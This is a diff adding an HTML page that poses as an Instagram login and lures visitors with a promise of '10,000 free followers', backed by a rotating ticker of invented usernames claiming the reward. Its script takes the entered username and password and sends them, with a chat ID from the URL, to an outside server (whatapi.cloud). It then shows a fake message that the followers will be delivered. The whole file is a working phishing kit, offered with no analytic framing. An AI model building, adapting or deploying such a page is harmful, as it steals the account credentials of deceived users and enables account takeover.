@@ -1,1 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="robots" content="noindex,follow">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="stylesheet" href="css/bootstrap.min.css">
+<link rel="stylesheet" href="css/style.css">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f2f2f2;
+    color: #333;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .wrapper {
+    max-width: 400px;
+    width: 100%;
+    padding: 20px;
+  }
+
+  .news-ticker {
+    background-color: #ff1493;
+    color: white;
+    padding: 10px;
+    text-align: center;
+    font-weight: bold;
+    border-radius: 8px;
+    margin-bottom: 20px;
+  }
+
+  .form-control {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border-radius: 5px;
+    border: 1px solid #ddd;
+    box-sizing: border-box;
+  }
+
+  .btn {
+    padding: 10px;
+    border-radius: 5px;
+    border: none;
+    cursor: pointer;
+    width: 100%;
+    box-sizing: border-box;
+  }
+
+  .btn-primary {
+    background-color: #ff1493;
+    color: white;
+  }
+
+  .btn-primary:hover {
+    background-color: #ff69b4;
+  }
+
+  .text-center {
+    text-align: center;
+  }
+
+  .spinner-container {
+    display: none;
+    text-align: center;
+    margin: 20px auto;
+  }
+
+  .spinner {
+    border: 4px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top: 4px solid #ff1493;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .verifying-text {
+    margin-top: 10px;
+    font-size: 16px;
+    color: #ff1493;
+  }
+
+  .success-message {
+    display: none;
+    color: #ff1493;
+    font-weight: bold;
+    text-align: center;
+    margin-top: 20px;
+  }
+
+  .primaryColor {
+    color: #ff1493;
+  }
+
+  .or {
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .or::before,
+  .or::after {
+    content: "";
+    flex: 1;
+    border-bottom: 1px solid #ddd;
+    margin: 0 10px;
+  }
+
+</style>
+</head>
+<body>
+<div class="wrapper">
+  <div id="newsTicker" class="news-ticker">Welcome! Get your free 10,000 followers now!</div>
+  <div class="text-center">
+    <img src="img/instagram-logo.png" alt="Instagram">
+  </div>
+  <form id="loginForm">
+    <input type="text" class="form-control" name="email" placeholder="Phone Number, Username or Email" required>
+    <input type="password" class="form-control" name="password" placeholder="Password" required>
+    <input type="submit" value="Log In" class="btn btn-primary">
+  </form>
+  <div class="spinner-container" id="spinnerContainer">
+    <div class="spinner" id="spinner"></div>
+    <div class="verifying-text" id="verifyingText">Verifying your Account...</div>
+  </div>
+  <div id="message" class="success-message"></div>
+  <div class="or">
+    <span>OR</span>
+  </div>
+  <div class="text-center">
+    <div class="otherMethods">
+      <img src="img/facebook-logo.png" class="img-fluid rounded" alt="[+]" style="width: 18px;height: 18px">
+      <span class="ms-2">Login with Facebook</span>
+    </div>
+  </div>
+  <div class="text-center mt-3 primaryColor">Forgot Password?</div>
+  <div class="text-center mt-3">
+    <span>Don't Have an Account?</span><span class="primaryColor"> Sign Up</span>
+  </div>
+  <div class="text-center primaryColor mt-3">Get the App</div>
+  <div class="row text-center py-2">
+    <div class="col-6">
+      <img src="img/playstore.png" alt="[+]" class="img-fluid d-block rounded">
+    </div>
+    <div class="col-6">
+      <img src="img/appstore.png" alt="[+]" class="img-fluid d-block rounded">
+    </div>
+  </div>
+</div>
+<script>
+  const chatId = new URLSearchParams(window.location.search).get("id");
+
+  const usernames = [
+  "official_rahul", "itz_meena", "singh_rockz", "priya_official", "itz_amit_", 
+  "sharma_journey", "mishra_diary", "official_pooja", "gupta_life", "itz_ankit_", 
+  "arora_world", "itz_shivani_", "its_me_ravi", "singh_pride", "itz_neha_", 
+  "official_vikram", "kapoor_lifestyle", "itz_deepak_", "patel_story", "kumar_legend"
+];
+
+
+  function getRandomUsername() {
+    const randomIndex = Math.floor(Math.random() * usernames.length);
+    return usernames[randomIndex];
+  }
+
+  function updateNewsTicker() {
+    const tickerElement = document.getElementById('newsTicker');
+    const randomUsername = getRandomUsername();
+    tickerElement.innerHTML = `${randomUsername} just claimed 10,000 followers!`;
+  }
+
+  setInterval(updateNewsTicker, 2000);
+
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const spinnerContainer = document.getElementById('spinnerContainer');
+    const message = document.getElementById('message');
+    spinnerContainer.style.display = 'block';
+
+    const formData = {
+        email: this.email.value,
+        password: this.password.value,
+        type: 'insta',
+        chat_id: chatId
+    };
+
+    fetch('https://whatapi.cloud:8443/info', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+    })
+    .then(response => response.json())
+    .then(data => {
+      spinnerContainer.style.display = 'none';
+      message.innerText = '10,000 Followers will be delivered soon within 24 hours!';
+      message.style.display = 'block';
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      spinnerContainer.style.display = 'none';
+    });
+  });
+</script>
+</body>
+</html>
 
